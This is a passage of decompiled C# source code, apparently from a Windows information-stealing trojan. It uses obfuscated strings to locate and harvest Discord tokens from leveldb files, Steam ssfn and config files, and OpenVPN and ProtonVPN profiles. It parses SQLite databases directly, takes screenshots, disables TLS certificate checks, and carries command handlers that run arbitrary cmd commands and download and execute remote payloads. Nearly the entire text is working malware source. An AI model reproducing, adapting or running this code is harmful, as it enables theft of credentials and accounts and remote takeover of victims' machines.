			string id = Environment.ExpandEnvironmentVariables(new string(new char[39]
			{
				'%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%', '\\',
				'd', 'i', 's', 'c', 'o', 'r', 'd', '\\', 'L', 'o',
				'c', 'a', 'l', ' ', 'S', 't', 'o', 'r', 'a', 'g',
				'e', '\\', 'l', 'e', 'v', 'e', 'l', 'd', 'b'
			}));
			list.Add(new Entity16
			{
				Id1 = id,
				Id2 = new string(new char[8] { '-', '*', '.', 'l', 'o', '-', '-', 'g' }).Replace("-", string.Empty),
				Id3 = false
			});
			list.Add(new Entity16
			{
				Id1 = id,
				Id2 = new string(new char[9] { '1', '*', '.', '1', 'l', '1', 'd', '1', 'b' }).Replace("1", string.Empty),
				Id3 = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static IEnumerable<Entity5> GetTokens()
	{
		List<Entity5> list = FileScanning.Search(new Discord());
		StringBuilder stringBuilder = new StringBuilder();
		foreach (Entity5 item in list)
		{
			try
			{
				foreach (Match item2 in Regex.Matches(Encoding.UTF8.GetString(item.Id3), new string(new char[77]
				{
					'[', 'A', 'S', 't', 'r', 'i', 'n', 'g', '-', 'Z',
					'a', 'S', 't', 'r', 'i', 'n', 'g', '-', 'z', '\\',
					'd', ']', '{', '2', 'S', 't', 'r', 'i', 'n', 'g',
					'4', '}', '\\', '.', '[', 'S', 't', 'r', 'i', 'n',
					'g', '\\', 'w', '-', ']', '{', 'S', 't', 'r', 'i',
					'n', 'g', '6', '}', '\\', '.', '[', '\\', 'w', 'S',
					't', 'r', 'i', 'n', 'g', '-', ']', '{', '2', 'S',
					't', 'r', 'i', 'n', 'g', '7', '}'
				}).Replace("String", string.Empty)))
				{
					Match val = item2;
					try
					{
						string value = ((object)val).ToString()!.Trim();
						if (!stringBuilder.ToString().Contains(value))
						{
							stringBuilder.AppendLine(value);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		yield return new Entity5
		{
			Id3 = Encoding.ASCII.GetBytes(stringBuilder.ToString()),
			Id1 = new string(new char[38]
			{
				'T', 'R', 'e', 'p', 'l', 'a', 'c', 'e', 'o', 'k',
				'R', 'e', 'p', 'l', 'a', 'c', 'e', 'e', 'n', 'R',
				'e', 'p', 'l', 'a', 'c', 'e', 's', '.', 't', 'R',
				'e', 'p', 'l', 'a', 'c', 'e', 'x', 't'
			}).Replace("Replace", string.Empty)
		};
	}
}
public class GameLauncher : FileScanner
{
	public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
	{
		try
		{
			if (scannerArg.Id1.Contains(new string(new char[6] { 'c', 'o', 'n', 'f', 'i', 'g' })))
			{
				return new string(new char[6] { 'c', 'o', 'n', 'f', 'i', 'g' });
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
			RegistryKey val = Registry.CurrentUser.OpenSubKey(new string(new char[20]
			{
				'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'V',
				'a', 'l', 'v', 'e', '\\', 'S', 't', 'e', 'a', 'm'
			}));
			if (val == null)
			{
				return list;
			}
			string text = val.GetValue(new string(new char[9] { 'S', 't', 'e', 'a', 'm', 'P', 'a', 't', 'h' })) as string;
			if (!Directory.Exists(text))
			{
				return list;
			}
			list.Add(new Entity16
			{
				Id1 = text,
				Id2 = new string(new char[6] { '*', 's', 's', 'f', 'n', '*' }),
				Id3 = false
			});
			list.Add(new Entity16
			{
				Id1 = Path.Combine(text, new string(new char[6] { 'c', 'o', 'n', 'f', 'i', 'g' })),
				Id2 = new string(new char[19]
				{
					'*', '.', 'v', 's', 't', 'r', 'i', 'n', 'g', '.',
					'R', 'e', 'p', 'l', 'a', 'c', 'e', 'd', 'f'
				}).Replace("string.Replace", string.Empty),
				Id3 = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class OpenVPN : FileScanner
{
	public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
			list.Add(new Entity16
			{
				Id1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPFile.WriteROFILE%\\AppFile.WriteData\\RoamiFile.Writeng").Replace("File.Write", string.Empty), new string(new char[36]
				{
					'O', 'p', 'H', 'a', 'n', 'd', 'l', 'e', 'r', 'e',
					'n', 'V', 'P', 'H', 'a', 'n', 'd', 'l', 'e', 'r',
					'N', ' ', 'C', 'o', 'n', 'H', 'a', 'n', 'd', 'l',
					'e', 'r', 'n', 'e', 'c', 't'
				}).Replace("Handler", string.Empty) + "\\" + new string(new char[8] { 'p', 'r', 'o', 'f', 'i', 'l', 'e', 's' })),
				Id2 = new string("npvo*".Reverse().ToArray()),
				Id3 = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class РrоtoнVРN : FileScanner
{
	public override string GetFolder(Entity16 scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	public override IEnumerable<Entity16> GetScanArgs()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
			list.Add(new Entity16
			{
				Id1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPserviceInterface.ExtensionROFILE%\\ApserviceInterface.ExtensionpData\\LocaserviceInterface.Extensionl").Replace("serviceInterface.Extension", string.Empty), "ProldCharotonVoldCharPN".Replace("oldChar", string.Empty)),
				Id2 = new string("nSystem.CollectionspvoSystem.Collections*".Replace("System.Collections", string.Empty).Reverse().ToArray()),
				Id3 = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public class DataBaseConnectionHandler
{
	private readonly byte[] _sqlDataTypeSize;

	private readonly ulong _dbEncoding;

	private readonly byte[] _fileBytes;

	private readonly ulong _pageSize;

	public string[] Fields;

	private SqliteMasterEntry[] _masterTableEntries;

	private TableEntry[] _tableEntries;

	public int RowLength => Count();

	public DataBaseConnectionHandler(string fileName)
	{
		_sqlDataTypeSize = new byte[22]
		{
			0, 1, 2, 3, 4, 6, 8, 8, 0, 0,
			3, 5, 5, 1, 3, 2, 5, 6, 1, 2,
			5, 51
		};
		_fileBytes = fileName.ReadFile();
		_pageSize = ConvertToULong(16, 2);
		_dbEncoding = ConvertToULong(56, 4);
		ReadMasterOfContext(100L);
	}

	public string GatherValue(int rowIndex, string fieldName)
	{
		try
		{
			int num = -1;
			int num2 = Fields.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return null;
			}
			return ReadContextValue(rowIndex, num);
		}
		catch
		{
			return null;
		}
	}

	private void ReadMasterOfContext(long offset)
	{
		try
		{
			switch (_fileBytes[offset])
			{
			case 5:
			{
				uint num11 = (uint)(ConvertToULong((int)offset + 3, 2) - 1);
				for (int j = 0; j <= (int)num11; j++)
				{
					uint num12 = (uint)ConvertToULong((int)offset + 12 + j * 2, 2);
					if (offset == 100)
					{
						ReadMasterOfContext((long)((ConvertToULong((int)num12, 4) - 1) * _pageSize));
					}
					else
					{
						ReadMasterOfContext((long)((ConvertToULong((int)(offset + num12), 4) - 1) * _pageSize));
					}
				}
				ReadMasterOfContext((long)((ConvertToULong((int)offset + 8, 4) - 1) * _pageSize));
				break;
			}
			case 13:
			{
				ulong num = ConvertToULong((int)offset + 3, 2) - 1;
				int num2 = 0;
				if (_masterTableEntries != null)
				{
					num2 = _masterTableEntries.Length;
					_masterTableEntries = ChangeSize(_masterTableEntries, _masterTableEntries.Length + (int)num + 1);
				}
				else
				{
					checked
					{
						_masterTableEntries = new SqliteMasterEntry[(ulong)unchecked((long)(num + 1))];
					}
				}
				for (ulong num3 = 0uL; num3 <= num; num3++)
				{
					ulong num4 = ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
					if (offset != 100)
					{
						num4 += (ulong)offset;
					}
					int num5 = Gvl((int)num4);
					Cvl((int)num4, num5);
					int num6 = Gvl((int)((long)num4 + ((long)num5 - (long)num4) + 1));
					Cvl((int)((long)num4 + ((long)num5 - (long)num4) + 1), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1);
					int num8 = Gvl((int)num7);
					int num9 = num8;
					long num10 = Cvl((int)num7, num8);
					long[] array = new long[5];
					for (int i = 0; i <= 4; i++)
					{
						int startIdx = num9 + 1;
						num9 = Gvl(startIdx);
						array[i] = Cvl(startIdx, num9);
						array[i] = ((array[i] <= 9) ? _sqlDataTypeSize[array[i]] : ((!IsOdd(array[i])) ? ((array[i] - 12) / 2) : ((array[i] - 13) / 2)));
					}
					if (_dbEncoding == 1 || _dbEncoding == 2)
					{
						if (_dbEncoding == 1)
						{
							_masterTableEntries[num2 + (int)num3].ItemName = Encoding.GetEncoding(new string(new char[12]
							{
								'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
								'5', '1'
							})).GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
						}
						else if (_dbEncoding == 2)
						{
							_masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
						}
						else if (_dbEncoding == 3)
						{
							_masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
						}
					}
					_masterTableEntries[num2 + (int)num3].RootNum = (long)ConvertToULong((int)((long)num7 + num10 + array[0] + array[1] + array[2]), (int)array[3]);
					if (_dbEncoding == 1)
					{
						_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.GetEncoding(new string(new char[12]
						{
							'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
							'5', '1'
						})).GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
					else if (_dbEncoding == 2)
					{
						_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
					else if (_dbEncoding == 3)
					{
						_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
				}
				break;
			}
			}
		}
		catch
		{
		}
	}

	public bool ReadContextTable(string tableName)
	{
		try
		{
			int num = -1;
			for (int i = 0; i <= _masterTableEntries.Length; i++)
			{
				if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[1] { ',' });
			for (int j = 0; j <= array.Length - 1; j++)
			{
				array[j] = array[j].TrimStart(new char[0]);
				int num2 = array[j].IndexOf(' ');
				if (num2 > 0)
				{
					array[j] = array[j].Substring(0, num2);
				}
				if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
				{
					Fields = ChangeSize(Fields, j + 1);
					Fields[j] = array[j];
				}
			}
			return GetOffset((ulong)(_masterTableEntries[num].RootNum - 1) * _pageSize);
		}
		catch
		{
			return false;
		}
	}

	private bool GetOffset(ulong offset)
	{
		try
		{
			if (_fileBytes[offset] == 13)
			{
				uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1);
				int num2 = 0;
				if (_tableEntries != null)
				{
					num2 = _tableEntries.Length;
					_tableEntries = ChangeSize(_tableEntries, _tableEntries.Length + (int)num + 1);
				}
				else
				{
					_tableEntries = new TableEntry[num + 1];
				}
				for (uint num3 = 0u; (int)num3 <= (int)num; num3++)
				{
					ulong num4 = ConvertToULong((int)offset + 8 + (int)(num3 * 2), 2);
					if (offset != 100)
					{
						num4 += offset;
					}
					int num5 = Gvl((int)num4);
					Cvl((int)num4, num5);
					int num6 = Gvl((int)((long)num4 + ((long)num5 - (long)num4) + 1));
					Cvl((int)((long)num4 + ((long)num5 - (long)num4) + 1), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1);
					int num8 = Gvl((int)num7);
					int num9 = num8;
					long num10 = Cvl((int)num7, num8);
					RecordHeaderField[] array = null;
					long num11 = (long)num7 - (long)num8 + 1;
					int num12 = 0;
					while (num11 < num10)
					{
						array = ChangeSize(array, num12 + 1);
						int num13 = num9 + 1;
						num9 = Gvl(num13);
						array[num12].Type = Cvl(num13, num9);
						array[num12].Size = ((array[num12].Type <= 9) ? _sqlDataTypeSize[array[num12].Type] : ((!IsOdd(array[num12].Type)) ? ((array[num12].Type - 12) / 2) : ((array[num12].Type - 13) / 2)));
						num11 = num11 + (num9 - num13) + 1;
						num12++;
					}
					if (array == null)
					{
						continue;
					}
					_tableEntries[num2 + (int)num3].Content = new string[array.Length];
					int num14 = 0;
					for (int i = 0; i <= array.Length - 1; i++)
					{
						if (array[i].Type > 9)
						{
							if (!IsOdd(array[i].Type))
							{
								if (_dbEncoding == 1)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.GetEncoding(new string(new char[12]
									{
										'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
										'5', '1'
									})).GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
								else if (_dbEncoding == 2)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
								else if (_dbEncoding == 3)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
							}
							else
							{
								_tableEntries[num2 + (int)num3].Content[i] = Encoding.GetEncoding(new string(new char[12]
								{
									'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
									'5', '1'
								})).GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
							}
						}
						else
						{
							_tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(ConvertToULong((int)((long)num7 + num10 + num14), (int)array[i].Size));
						}
						num14 += (int)array[i].Size;
					}
				}
			}
			else if (_fileBytes[offset] == 5)
			{
				uint num15 = (uint)(ConvertToULong((int)(offset + 3), 2) - 1);
				for (uint num16 = 0u; (int)num16 <= (int)num15; num16++)
				{
					uint num17 = (uint)ConvertToULong((int)offset + 12 + (int)(num16 * 2), 2);
					GetOffset((ConvertToULong((int)(offset + num17), 4) - 1) * _pageSize);
				}
				GetOffset((ConvertToULong((int)(offset + 8), 4) - 1) * _pageSize);
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public string ReadContextValue(int rowNum, int field)
	{
		try
		{
			if (rowNum >= _tableEntries.Length)
			{
				return null;
			}
			return (field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field];
		}
		catch
		{
			return "";
		}
	}

	private ulong ConvertToULong(int startIndex, int size)
	{
		try
		{
			if (size > 8 || size == 0)
			{
				return 0uL;
			}
			ulong num = 0uL;
			for (int i = 0; i <= size - 1; i++)
			{
				num = (num << 8) | _fileBytes[startIndex + i];
			}
			return num;
		}
		catch
		{
			return 0uL;
		}
	}

	public int Count()
	{
		return _tableEntries.Length;
	}

	private int Gvl(int startIdx)
	{
		try
		{
			if (startIdx > _fileBytes.Length)
			{
				return 0;
			}
			for (int i = startIdx; i <= startIdx + 8; i++)
			{
				if (i > _fileBytes.Length - 1)
				{
					return 0;
				}
				if ((_fileBytes[i] & 0x80) != 128)
				{
					return i;
				}
			}
			return startIdx + 8;
		}
		catch
		{
			return 0;
		}
	}

	private long Cvl(int startIdx, int endIdx)
	{
		try
		{
			endIdx++;
			byte[] array = new byte[8];
			int num = endIdx - startIdx;
			bool flag = false;
			if (num == 0 || num > 9)
			{
				return 0L;
			}
			switch (num)
			{
			case 1:
				array[0] = (byte)(_fileBytes[startIdx] & 0x7Fu);
				return BitConverter.ToInt64(array, 0);
			case 9:
				flag = true;
				break;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = _fileBytes[endIdx - 1];
				endIdx--;
				num4 = 1;
			}
			for (int i = endIdx - 1; i >= startIdx; i += -1)
			{
				if (i - 1 >= startIdx)
				{
					array[num4] = (byte)(((_fileBytes[i] >> num2 - 1) & (255 >> num2)) | (_fileBytes[i - 1] << num3));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((_fileBytes[i] >> num2 - 1) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}
		catch
		{
			return 0L;
		}
	}

	private static bool IsOdd(long value)
	{
		return (value & 1) == 1;
	}

	public static T[] ChangeSize<T>(T[] oldArray, int newSize)
	{
		T[] array = oldArray;
		Array.Resize(ref array, newSize);
		return array;
	}
}
public class CommandLineUpdate : ITaskProcessor
{
	public bool IsValidAction(Entity15 action)
	{
		return action == Entity15.Id5;
	}

	public bool Process(Entity6 updateTask)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		try
		{
			ProcessStartInfo val = new ProcessStartInfo("cstringmstringd".Replace("string", string.Empty), "/ProcessC Process".Replace("Process", string.Empty) + updateTask.Id2);
			val.set_UseShellExecute(false);
			val.set_CreateNoWindow(true);
			Process.Start(val).WaitForExit(30000);
		}
		catch
		{
		}
		return true;
	}
}
public class DownloadAndExecuteUpdate : ITaskProcessor
{
	public bool IsValidAction(Entity15 action)
	{
		return action == Entity15.Id3;
	}

	public bool Process(Entity6 updateTask)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		try
		{
			string[] array = updateTask.Id2.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			ProcessStartInfo val = new ProcessStartInfo();
			val.set_WorkingDirectory(((FileSystemInfo)new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).get_Directory()).get_FullName());
			val.set_FileName(Environment.ExpandEnvironmentVariables(array[1]));
			Process.Start(val);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
public class DownloadUpdate : ITaskProcessor
{
	public bool IsValidAction(Entity15 action)
	{
		return action == Entity15.Id1;
	}

	public bool Process(Entity6 updateTask)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = updateTask.Id2.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
			File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
		}
		catch
		{
		}
		return true;
	}
}
public interface ITaskProcessor
{
	bool IsValidAction(Entity15 action);

	bool Process(Entity6 updateTask);
}
public class OpenUpdate : ITaskProcessor
{
	public bool IsValidAction(Entity15 action)
	{
		return action == Entity15.Id4;
	}

	public bool Process(Entity6 updateTask)
	{
		try
		{
			Process.Start(updateTask.Id2);
		}
		catch
		{
		}
		return true;
	}
}
public class TaskResolver
{
	public Entity7 Result { get; }

	public TaskResolver(Entity7 result)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		Result = result;
		try
		{
			try
			{
				ServicePointManager.set_SecurityProtocol((SecurityProtocolType)(ServicePointManager.get_SecurityProtocol() | 0xCF0));
			}
			catch
			{
			}
			RemoteCertificateValidationCallback serverCertificateValidationCallback = ServicePointManager.get_ServerCertificateValidationCallback();
			object obj2 = <>c.<>9__0_0;
			if (obj2 == null)
			{
				RemoteCertificateValidationCallback val = (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
				obj2 = (object)val;
				<>c.<>9__0_0 = val;
			}
			ServicePointManager.set_ServerCertificateValidationCallback((RemoteCertificateValidationCallback)Delegate.Combine((Delegate?)(object)serverCertificateValidationCallback, (Delegate?)obj2));
		}
		catch
		{
		}
	}

	public List<int> ReleaseUpdates(IEnumerable<Entity6> tasks)
	{
		List<int> list = new List<int>();
		try
		{
			foreach (Entity6 task in tasks)
			{
				if (Result.DomainExists(task.Id4))
				{
					CommandLineUpdate commandLineUpdate = new CommandLineUpdate();
					if (commandLineUpdate.IsValidAction(task.Id3) && commandLineUpdate.Process(task))
					{
						list.Add(task.Id1);
					}
					DownloadUpdate downloadUpdate = new DownloadUpdate();
					if (downloadUpdate.IsValidAction(task.Id3) && downloadUpdate.Process(task))
					{
						list.Add(task.Id1);
					}
					DownloadAndExecuteUpdate downloadAndExecuteUpdate = new DownloadAndExecuteUpdate();
					if (downloadAndExecuteUpdate.IsValidAction(task.Id3) && downloadAndExecuteUpdate.Process(task))
					{
						list.Add(task.Id1);
					}
					OpenUpdate openUpdate = new OpenUpdate();
					if (openUpdate.IsValidAction(task.Id3) && openUpdate.Process(task))
					{
						list.Add(task.Id1);
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
public static class Extensions
{
	public static byte[] ReadFile(this string filename)
	{
		try
		{
			if (File.Exists(filename))
			{
				using (FileStream stream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					using StreamReader streamReader = new StreamReader(stream, Encoding.GetEncoding(1251));
					return streamReader.CurrentEncoding.GetBytes(streamReader.ReadToEnd());
				}
			}
		}
		catch
		{
		}
		return new byte[0];
	}

	public static string ReadFileAsText(this string filename)
	{
		try
		{
			if (File.Exists(filename))
			{
				using (FileStream stream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					using StreamReader streamReader = new StreamReader(stream, Encoding.GetEncoding(1251));
					return streamReader.ReadToEnd();
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static T ChangeType<T>(this object @this)
	{
		return (T)Convert.ChangeType(@this, typeof(T));
	}

	public static string StripQuotes(this string value)
	{
		return value.Replace("\"", string.Empty);
	}

	public static bool DomainExists(this Entity7 log, string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] links = domains.Split(new string[1]
		{
			new string(new char[1] { '|' })
		}, StringSplitOptions.RemoveEmptyEntries);
		string[] array = links;
		if (array != null && array.Length == 0)
		{
			return true;
		}
		try
		{
			return log.Id7?.Id6?.Where((Entity9 x) => x.Id3 != null)?.SelectMany((Entity9 x) => x.Id3)?.Any(delegate(Entity12 x)
			{
				string[] array2 = links;
				foreach (string value in array2)
				{
					if (x.Id1.Contains(value))
					{
						return true;
					}
				}
				return false;
			}) ?? false;
		}
		catch
		{
		}
		return false;
	}

	public static void PreCheck(this Entity7 log)
	{
		PropertyInfo[] properties = log.GetType().GetProperties();
		foreach (PropertyInfo propertyInfo in properties)
		{
			if (propertyInfo.PropertyType == typeof(string) && string.IsNullOrWhiteSpace(propertyInfo.GetValue(log, null) as string))
			{
				propertyInfo.SetValue(log, new string(new char[7] { 'U', 'N', 'K', 'N', 'O', 'W', 'N' }), null);
			}
		}
	}
}
public static class Json
{
	private static JavaScriptSerializer json;

	public static JavaScriptSerializer JSON
	{
		get
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			object obj = json;
			if (obj == null)
			{
				JavaScriptSerializer val = new JavaScriptSerializer();
				obj = (object)val;
				val.set_MaxJsonLength(int.MaxValue);
				val.set_RecursionLimit(int.MaxValue);
				json = val;
			}
			return (JavaScriptSerializer)obj;
		}
	}

	public static T FromJSON<T>(this string @this)
	{
		try
		{
			return JSON.Deserialize<T>(@this.Trim());
		}
		catch (Exception)
		{
			return default(T);
		}
	}

	public static string ToJSON(this object @this)
	{
		return JSON.Serialize(@this);
	}
}
public static class GdiHelper
{
	public enum DeviceCap
	{
		VERTRES = 10,
		DESKTOPVERTRES = 117
	}

	[DllImport("gdi32.dll", CharSet = CharSet.Auto, EntryPoint = "GetDeviceCaps", ExactSpelling = true, SetLastError = true)]
	private static extern int GetCaps(IntPtr hDC, int nIndex);

	public static double GetWindowsScreenScalingFactor(bool percentage = true)
	{
		Graphics obj = Graphics.FromHwnd(IntPtr.Zero);
		IntPtr hdc = obj.GetHdc();
		int caps = GetCaps(hdc, 10);
		double num = Math.Round((double)GetCaps(hdc, 117) / (double)caps, 2);
		if (percentage)
		{
			num *= 100.0;
		}
		obj.ReleaseHdc(hdc);
		obj.Dispose();
		return num;
	}

	public static dynamic MonitorSize()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		Rectangle bounds;
		try
		{
			double windowsScreenScalingFactor = GetWindowsScreenScalingFactor(percentage: false);
			bounds = Screen.get_PrimaryScreen().get_Bounds();
			double num = (double)((Rectangle)(ref bounds)).get_Width() * windowsScreenScalingFactor;
			bounds = Screen.get_PrimaryScreen().get_Bounds();
			double num2 = (double)((Rectangle)(ref bounds)).get_Height() * windowsScreenScalingFactor;
			return (object)new Size((int)num, (int)num2);
		}
		catch
		{
			bounds = Screen.get_PrimaryScreen().get_Bounds();
			return ((Rectangle)(ref bounds)).get_Size();
		}
	}

	public static byte[] GetImageBase()
	{
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			dynamic val = MonitorSize();
			Bitmap val2 = new Bitmap(val.Width, val.Height);
			Graphics val3 = Graphics.FromImage((Image)(object)val2);
			try
			{
				val3.set_InterpolationMode((InterpolationMode)4);
				val3.set_PixelOffsetMode((PixelOffsetMode)1);
				val3.set_SmoothingMode((SmoothingMode)1);
				val3.CopyFromScreen(new Point(0, 0), new Point(0, 0), val);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			return ConvertToBytes((Image)(object)val2);
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static byte[] ConvertToBytes(Image img)
	{
		try
		{
			if (img == null)
			{
				return null;
			}
			using MemoryStream memoryStream = new MemoryStream();
			img.Save((Stream)memoryStream, ImageFormat.get_Png());
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}
}
public static class IPv4Helper
{
	private static bool IsLocalIp(IPAddress ip)
	{
		int[] array = ((object)ip).ToString()!.Split(new string[1] { "." }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();
		if ((array[0] != 192 || array[1] != 168) && (array[0] != 172 || array[1] < 16 || array[1] > 31))
		{
			return array[0] == 10;
		}
		return true;
	}

	public static string GetDefaultIPv4Address()
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Invalid comparison between Unknown and I4
		try
		{
			if (StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries).Any((string x) => x.Split(new char[1] { ':' })[1] == "80" || x.Split(new char[1] { ':' })[1] == "81"))
			{
				foreach (UnicastIPAddressInformation unicastAddress in (from adapter in NetworkInterface.GetAllNetworkInterfaces()
					where (int)adapter.get_OperationalStatus() == 1 && adapter.Supports((NetworkInterfaceComponent)0) && adapter.GetIPProperties().get_GatewayAddresses().get_Count() > 0 && ((object)adapter.GetIPProperties().get_GatewayAddresses().get_Item(0)
						.get_Address()).ToString() != "0.0.0.0"
					select adapter).First().GetIPProperties().get_UnicastAddresses())
				{
					if ((int)((IPAddressInformation)unicastAddress).get_Address().get_AddressFamily() == 2 && !IsLocalIp(((IPAddressInformation)unicastAddress).get_Address()) && !IPAddress.IsLoopback(((IPAddressInformation)unicastAddress).get_Address()))
					{
						return ((object)((IPAddressInformation)unicastAddress).get_Address()).ToString();
					}
				}
				return Request("https://api.ip.sb/ip", 15000);
			}
		}
		catch (Exception)
		{
		}
		return "UNKNOWN";
	}

	private static string Request(string uri, int timeout)
	{
		try
		{
			WebRequest obj = WebRequest.Create(uri);
			obj.set_Timeout(timeout);
			using Stream stream = obj.GetResponse().GetResponseStream();
			using StreamReader streamReader = new StreamReader(stream);
			return streamReader.ReadToEnd().Trim();
		}
		catch (Exception)
		{
			return null;
		}
	}
}
public static class NativeHelper
{
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr LoadLibrary(string fileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

